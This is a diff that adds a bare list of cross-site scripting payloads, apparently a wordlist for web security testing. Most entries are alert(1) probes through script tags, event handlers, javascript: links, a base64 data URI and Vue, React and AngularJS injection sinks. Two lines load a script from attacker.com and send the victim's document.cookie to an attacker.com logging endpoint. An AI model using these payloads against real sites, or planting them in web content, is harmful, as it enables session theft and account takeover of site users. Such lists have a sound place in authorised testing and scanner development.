@@ -1,0 +1,21 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+"><body onload=alert(1)>
+"><iframe src="javascript:alert(1)"></iframe>
+<img src=x onerror=alert('XSS')>
+<script>alert('XSS')</script>
+<script src="https://attacker.com/xss.js"></script>
+new Image().src = "https://attacker.com/log?cookie=" + document.cookie;
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+{"__html": "<img src=x onerror=alert(1)>"}
+<div ng-app><input ng-focus=$event.path[0].ownerDocument.defaultView.alert(1) autofocus>
+<div onmouseover=alert(1)>hover me</div>
+<a href="javascript:alert(1)">Click me</a>
+<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>
+<a href="#" onclick=alert(1)>Click</a>
+<video onvolumechange=alert(1) autoplay>
+https://site.com/page#<img src=x onerror=alert(1)>
+document.write(location.hash)
+<script>alert(document.cookie)</script>
